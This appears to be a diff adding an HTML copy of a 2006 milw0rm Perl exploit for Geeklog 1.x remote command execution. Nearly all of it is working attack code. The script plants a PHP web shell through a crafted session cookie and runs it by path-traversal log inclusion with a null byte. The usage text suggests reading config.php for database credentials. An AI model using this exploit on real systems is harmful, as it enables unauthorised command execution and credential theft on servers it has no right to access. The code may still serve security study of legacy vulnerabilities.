@@ -1,0 +1,65 @@
+<html><head><title>GeekLog 1.* (error.log) Remote Commands Execution Exploit (gpc = Off)</title></head><pre>#!/usr/bin/perl -w
+use IO::Socket;
+
+print &quot;*************************************************************************\r\n&quot;;
+print &quot;|                   Geeklog 1.* remote commands execution               |\r\n&quot;;
+print &quot;|                     By rgod rgod&lt;AT&gt;autistici&lt;DOT&gt;org                 |\r\n&quot;;
+print &quot;|                   site: http://retrogod.altervista.org                |\r\n&quot;;
+print &quot;|                                                                       |\r\n&quot;;
+print &quot;*************************************************************************\r\n&quot;;
+print &quot;| -&gt; this works against magic_quotes_gpc = Off                          |\r\n&quot;;
+print &quot;*************************************************************************\r\n&quot;;
+sub main::urlEncode {
+    my ($string) = @_;
+    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
+    #$string# =~ tr/.//;
+    return $string;
+ }
+
+$serv=$ARGV[0];
+$path=$ARGV[1];
+$cmd=&quot;&quot;; for ($i=2; $i&lt;=$#ARGV; $i++) {$cmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};
+
+if (@ARGV &lt; 3)
+{
+print &quot;Usage:\r\n&quot;;
+print &quot;perl pblg_xpl.pl SERVER PATH COMMAND\r\n\r\n&quot;;
+print &quot;SERVER         - Server where Geeklog is installed.\r\n&quot;;
+print &quot;PATH           - Path to Geeklog (ex: /geeklog/ or just /) \r\n&quot;;
+print &quot;COMMAND        - a shell command (\&quot;cat ./../config.php\&quot; to see database\r\n&quot;;
+print &quot;                 username &amp; password\&quot;)\r\n&quot;;
+print &quot;Example:\r\n&quot;;
+print &quot;perl geeklog_14_xpl.pl localhost /geeklog/ ls -la \r\n&quot;;
+exit();
+}
+
+  $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
+  or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
+
+  $shell='&lt;?php ob_clean();echo&quot;Hi Master!\r\n&quot;;ini_set(&quot;max_execution_time&quot;,0);passthru($_GET[CMD]);die;?&gt;';
+  $shell=urlEncode($shell);
+  $data=&quot;loginname=sun&amp;passwd=sun&quot;;
+  print $sock &quot;POST &quot;.$path.&quot;users.php HTTP/1.1\r\n&quot;;
+  print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
+  print $sock &quot;Content-Length: &quot;.length($data).&quot;\r\n&quot;;
+  print $sock &quot;Cookie: gl_session=%27&quot;.$shell.&quot;\r\n&quot;;
+  print $sock &quot;Connection: Close\r\n\r\n&quot;;
+  print $sock $data;
+  close($sock);
+
+  $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
+  or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
+
+  $xpl=&quot;../logs/error.log&quot;;
+  $xpl=urlEncode($xpl).&quot;%00&quot;;
+  print $sock &quot;GET &quot;.$path.&quot;index.php?CMD=&quot;.$cmd.&quot; HTTP/1.1\r\n&quot;;
+  print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
+  print $sock &quot;Cookie: language=&quot;.$xpl.&quot;;\r\n&quot;;
+  print $sock &quot;Connection: Close\r\n\r\n&quot;;
+
+  while ($answer = &lt;$sock&gt;) {
+    print $answer;
+  }
+  close($sock);
+
+# milw0rm.com [2006-02-20]</pre></html>
